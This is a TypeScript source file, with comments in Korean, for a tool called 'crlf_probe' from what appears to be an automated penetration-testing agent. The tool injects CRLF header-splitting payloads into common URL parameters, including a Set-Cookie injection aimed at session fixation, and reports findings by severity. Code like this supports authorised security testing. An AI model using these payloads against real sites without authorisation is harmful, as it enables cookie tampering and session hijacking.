/**
 * crlf_probe — CRLF/응답 헤더 분할(Header Injection) 탐지 + 실증.
 *
 * 파라미터 값에 `%0d%0aX-RedCell-Probe: <rand>` 및 이중 인코딩 `%250d%250a` 변형을
 * 주입해, 응답 헤더에 주입한 헤더가 실제로 나타나는지 본다.
 *   - Set-Cookie 주입(Set-Cookie 헤더 생성)          → high (세션 고정·쿠키 오염)
 *   - 일반 헤더 반사(X-RedCell-Probe 등)             → medium
 * FP 방어: **응답 헤더**에 주입 헤더가 보여야 한다. 본문 반사는 무시(서버가 인코딩해
 * 본문에만 나오면 클린 — 응답 분할이 아니다). 상태 변경 없음.
 */

import type { Tool, ToolContext, ToolResult } from "../core/types.js";
import { authGet, baseUrl, joinPath, withQuery } from "./util.js";

const DEFAULT_PARAMS = ["url", "to", "next", "redirect", "return", "dest", "path", "q", "name", "msg", "target", "callback", "hl", "lang", "theme"];
const DEFAULT_PATHS = ["/"];
const MAX_PATHS = 8;
const MAX_PARAMS = 6;

export const crlfProbe: Tool = {
  name: "crlf_probe",
  description:
    "파라미터에 CRLF(%0d%0a)를 주입해 응답 헤더 분할을 탐지한다. 응답 헤더에 주입 헤더가 실리면 실증 — Set-Cookie 주입 high, 일반 헤더 medium. 본문 반사는 무시(클린).",
  intent: "exploit",
  async run(args, ctx: ToolContext): Promise<ToolResult> {
    const base = baseUrl(ctx.target);
    const paths = pickPaths(args);
    const params = pickParams(args);
    const rand = Math.random().toString(36).slice(2, 8);
    const probeHeader = `X-RedCell-Probe-${rand}`;

    // 변형: 단일/이중 인코딩 + Set-Cookie 주입(세션 고정 시나리오).
    const variants: Array<{ label: string; val: string }> = [
      { label: "single", val: `%0d%0a${probeHeader}: 1` },
      { label: "double", val: `%250d%250a${probeHeader}: 1` },
      { label: "setcookie", val: `%0d%0aSet-Cookie: rc_crlf=${rand}; Path=/` },
    ];

    for (const path of paths) {
      for (const param of params.slice(0, MAX_PARAMS)) {
        for (const v of variants) {
          const url = joinPath(base, withQuery(path, { [param]: v.val }));
          let res;
          try {
            res = await authGet(ctx, url);
          } catch {
            continue;
          }
          // http-client 는 헤더 키를 소문자로 정규화한다 — 주입 헤더 이름도 소문자로 비교.
          // (실제 분할 시 주입 헤더는 새 헤더로 들어오지 않고 기존 Location 값의 일부인
          //  "X-RedCell-Probe-N: 1" 문자열로 관측될 수 있다 — 여기선 두 형태 모두 인정한다.)
          const h: Record<string, string> = {};
          for (const [k, val] of Object.entries(res.headers)) h[k.toLowerCase()] = String(val);
          const probeKey = probeHeader.toLowerCase();
          const injectedHeader =
            Object.keys(h).find((k) => k === probeKey) ??
            Object.keys(h).find((k) => k.includes("redcell-probe")) ??
            (h["location"] ?? "").includes(probeHeader) // Location 값에 새 헤더 문법이 실림
              ? (h["location"] ?? "").includes(":") ? "location" : null
              : null;
          const setCookieInjected =
            (h["set-cookie"] ?? "").includes(`rc_crlf=${rand}`) ||
            (h["location"] ?? "").includes(`Set-Cookie: rc_crlf=${rand}`);
          // 본문 반사만으로는 실증으로 세지 않는다(FP 방어 — CP 1)
          const bodyEchoOnly = !injectedHeader && !setCookieInjected && res.body.includes(rand);

          if (injectedHeader || setCookieInjected) {
            const evidence = setCookieInjected
              ? `CRLF 실증: 응답 헤더 분할 — Set-Cookie 주입 확인 (${path}?${param}, ${v.label} 인코딩)`
              : `CRLF 실증: 응답 헤더 분할 (X-RedCell-Probe 반사) (${path}?${param}, ${v.label} 인코딩)`;
            return {
              ok: true,
              summary: `CRLF 헤더 분할 실증: ${path} 의 param '${param}' (${v.label}, ${setCookieInjected ? "Set-Cookie" : "헤더"} 주입)`,
              fingerprint: { indicators: [`crlf ${path}?${param}`] },
              data: {
                severity: setCookieInjected ? "high" : "medium",
                title: `CRLF 헤더 분할 (param=${param})`,
                evidence,
                param,
                setCookie: setCookieInjected,
              },
            };
          }
          if (bodyEchoOnly) {
            return {
              ok: false,
              summary: `CRLF 미탐지: ${path}?${param} — 주입 마커가 본문에만 반사(응답 헤더 아님)`,
              data: {
                severity: "info",
                title: `입력 반사(본문, CRLF 아님) ${path}?${param}`,
                evidence: `CRLF 마커가 본문에만 등장 — 서버가 인코딩해 헤더 분할 아님(클린)`,
              },
            };
          }
        }
      }
    }
    return { ok: false, summary: `CRLF 헤더 분할 미탐지 (paths=${paths.join(",")}, params=${params.join(",")})` };
  },
};

function pickPaths(args: Record<string, unknown>): string[] {
  if (typeof args.path === "string" && args.path) return [args.path];
  if (Array.isArray(args.paths)) {
    const ps = args.paths.filter((x): x is string => typeof x === "string");
    if (ps.length) return [...new Set(ps)].slice(0, MAX_PATHS);
  }
  return DEFAULT_PATHS;
}

function pickParams(args: Record<string, unknown>): string[] {
  if (typeof args.param === "string" && args.param) return [args.param];
  if (Array.isArray(args.params)) {
    const ps = args.params.filter((x): x is string => typeof x === "string");
    if (ps.length) return [...new Set(ps)].slice(0, MAX_PARAMS);
  }
  return DEFAULT_PARAMS.slice(0, MAX_PARAMS);
}